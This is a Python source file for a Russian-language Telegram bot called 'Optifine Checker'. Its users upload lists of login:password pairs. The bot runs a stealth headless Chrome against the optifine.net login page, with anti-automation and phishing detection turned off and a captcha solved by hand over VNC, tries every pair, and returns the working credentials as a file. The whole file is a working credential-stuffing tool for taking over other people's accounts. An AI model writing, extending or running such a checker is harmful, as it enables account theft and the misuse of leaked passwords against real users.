import os
import sys
import logging
import asyncio
import aiofiles
import time
import subprocess
import json
from datetime import datetime
from typing import Dict, List, Tuple

import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА!")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

# Хранилище сессий
active_sessions = {}

# Создаем директории
os.makedirs('/app/debug', exist_ok=True)

class OptifineChecker:
    def __init__(self):
        self.driver = None
        logger.info("🚀 Инициализация OptifineChecker...")
    
    def init_driver(self):
        """Инициализация драйвера с отключенной безопасностью"""
        try:
            logger.info("🔍 Запуск Chrome с отключенной безопасностью...")
            
            options = uc.ChromeOptions()
            
            # Основные флаги
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            options.add_argument('--disable-gpu')
            options.add_argument('--headless=new')
            
            # Флаги для отключения безопасности
            options.add_argument('--disable-web-security')
            options.add_argument('--disable-features=IsolateOrigins,site-per-process')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-setuid-sandbox')
            options.add_argument('--allow-running-insecure-content')
            options.add_argument('--ignore-certificate-errors')
            options.add_argument('--disable-sync')
            
            # Дополнительные флаги для обхода защиты
            options.add_argument('--disable-client-side-phishing-detection')
            options.add_argument('--disable-crash-reporter')
            options.add_argument('--disable-popup-blocking')
            options.add_argument('--disable-notifications')
            options.add_argument('--disable-extensions')
            
            logger.info("🚀 Запуск undetected_chromedriver...")
            
            self.driver = uc.Chrome(
                options=options,
                version_main=145,
                headless=True
            )
            
            self.driver.set_page_load_timeout(30)
            logger.info("✅ Драйвер готов")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            return False
    
    def check_login_page(self):
        """Проверяет, доступна ли страница входа"""
        try:
            self.driver.get("https://optifine.net/login")
            time.sleep(3)
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            visible_inputs = [i for i in inputs if i.is_displayed()]
            logger.info(f"✅ Найдено полей ввода: {len(visible_inputs)}")
            return len(visible_inputs) >= 2
        except Exception as e:
            logger.error(f"❌ Ошибка проверки страницы: {e}")
            return False
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка аккаунта"""
        logger.info(f"🔍 Проверяю: {login[:20]}...")
        
        try:
            # Поиск полей
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            email_field = None
            password_field = None
            
            for inp in inputs:
                if inp.is_displayed():
                    input_type = inp.get_attribute('type')
                    if input_type in ['text', 'email']:
                        email_field = inp
                    elif input_type == 'password':
                        password_field = inp
            
            if not email_field or not password_field:
                logger.warning("❌ Поля не найдены")
                return {'login': login, 'status': 'error', 'error': 'Поля не найдены'}
            
            # Поиск кнопки
            buttons = self.driver.find_elements(By.TAG_NAME, "button")
            submit_button = None
            for btn in buttons:
                if btn.is_displayed() and ('login' in btn.text.lower() or 'sign' in btn.text.lower()):
                    submit_button = btn
                    break
            
            if not submit_button:
                logger.warning("❌ Кнопка не найдена")
                return {'login': login, 'status': 'error', 'error': 'Кнопка не найдена'}
            
            # Ввод логина
            email_field.clear()
            for char in login:
                email_field.send_keys(char)
                time.sleep(0.03)
            
            time.sleep(0.5)
            
            # Ввод пароля
            password_field.clear()
            for char in password:
                password_field.send_keys(char)
                time.sleep(0.03)
            
            time.sleep(0.5)
            
            # Нажатие кнопки
            submit_button.click()
            time.sleep(5)
            
            # Проверка результата
            current_url = self.driver.current_url
            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            
            if 'downloads' in current_url or 'profile' in current_url:
                logger.info(f"✅ РАБОЧИЙ: {login[:20]}")
                return {'login': login, 'password': password, 'status': 'valid'}
            elif 'invalid' in page_text or 'incorrect' in page_text:
                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
                return {'login': login, 'status': 'invalid', 'error': 'Неверный логин/пароль'}
            else:
                logger.info(f"⚠️ НЕОПРЕДЕЛЕННЫЙ: {login[:20]}")
                return {'login': login, 'status': 'invalid', 'error': 'Неопределенный результат'}
            
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return {'login': login, 'status': 'error', 'error': str(e)[:100]}
    
    def close(self):
        """Закрытие драйвера"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info("✅ Драйвер закрыт")
            except:
                pass

# --- Функции для работы с Railway ---
def get_railway_url():
    """Получает URL для доступа к VNC"""
    try:
        result = subprocess.run(['curl', '-s', 'http://metadata.railway.internal/'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            data = json.loads(result.stdout)
            hostname = data.get('hostname')
            if hostname:
                return f"https://{hostname}.railway.app"
    except:
        pass
    return "https://cs2-telegram-bot-production.up.railway.app"

# --- Telegram handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    railway_url = get_railway_url()
    
    await update.message.reply_text(
        f"👋 **Optifine Checker**\n\n"
        f"📱 **Доступ к браузеру:**\n"
        f"{railway_url}/vnc.html\n\n"
        f"📥 Отправь .txt файл с аккаунтами\n"
        f"Формат: логин:пароль\n\n"
        f"📊 Статистика: {bot_stats['total']} проверено"
    )

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    try:
        files = os.listdir('/app/debug')
        if files:
            for file in files[:5]:
                file_path = os.path.join('/app/debug', file)
                with open(file_path, 'rb') as f:
                    await update.message.reply_document(f, filename=file)
        else:
            await update.message.reply_text("📁 Папка debug пуста")
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")

async def process_file(file_path, update, context):
    async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
        content = await f.read()
    
    accounts = []
    for line in content.strip().split('\n'):
        if ':' in line:
            l, p = line.split(':', 1)
            accounts.append((l.strip(), p.strip()))
    
    if not accounts:
        await update.message.reply_text("❌ Нет аккаунтов")
        return
    
    session_id = f"{update.effective_user.id}_{int(time.time())}"
    railway_url = get_railway_url()
    
    keyboard = [
        [InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"done_{session_id}")],
        [InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{session_id}")]
    ]
    
    await update.message.reply_text(
        f"📊 Аккаунтов: {len(accounts)}\n\n"
        f"🖥️ Подключись к браузеру:\n"
        f"{railway_url}/vnc.html\n\n"
        f"1️⃣ Нажми Connect\n"
        f"2️⃣ Нажми галочку\n"
        f"3️⃣ Вернись и нажми кнопку",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    
    active_sessions[session_id] = {
        'user_id': update.effective_user.id,
        'accounts': accounts,
        'file_path': file_path
    }

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data.startswith('done_'):
        session_id = data.replace('done_', '')
        
        if session_id not in active_sessions:
            await query.edit_message_text("❌ Сессия устарела")
            return
        
        session = active_sessions[session_id]
        
        if query.from_user.id != session['user_id']:
            await query.answer("❌ Не ваша сессия", show_alert=True)
            return
        
        await query.edit_message_text("🚀 Начинаю проверку...")
        
        checker = OptifineChecker()
        if not checker.init_driver():
            await query.message.reply_text("❌ Ошибка запуска")
            del active_sessions[session_id]
            return
        
        if not checker.check_login_page():
            await query.message.reply_text("❌ Страница недоступна")
            checker.close()
            del active_sessions[session_id]
            return
        
        results = {'valid': [], 'invalid': []}
        total = len(session['accounts'])
        
        for i, (login, password) in enumerate(session['accounts'], 1):
            result = await checker.check_account(login, password)
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
            else:
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            bot_stats['total'] += 1
            await asyncio.sleep(2)
        
        if results['valid']:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            with open(valid_file, 'rb') as f:
                await query.message.reply_document(f, filename=valid_file)
            os.remove(valid_file)
        
        await query.message.reply_text(f"✅ Готово! Рабочих: {len(results['valid'])}")
        
        checker.close()
        
        if os.path.exists(session['file_path']):
            os.remove(session['file_path'])
        del active_sessions[session_id]
    
    elif data.startswith('cancel_'):
        session_id = data.replace('cancel_', '')
        if session_id in active_sessions:
            if os.path.exists(active_sessions[session_id]['file_path']):
                os.remove(active_sessions[session_id]['file_path'])
            del active_sessions[session_id]
        await query.edit_message_text("❌ Отменено")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Нужен .txt файл")
        return
    
    file = await context.bot.get_file(doc.file_id)
    path = f"temp_{update.effective_user.id}_{doc.file_name}"
    await file.download_to_drive(path)
    await process_file(path, update, context)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("debug", debug_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    app.run_polling()

if __name__ == '__main__':
    main()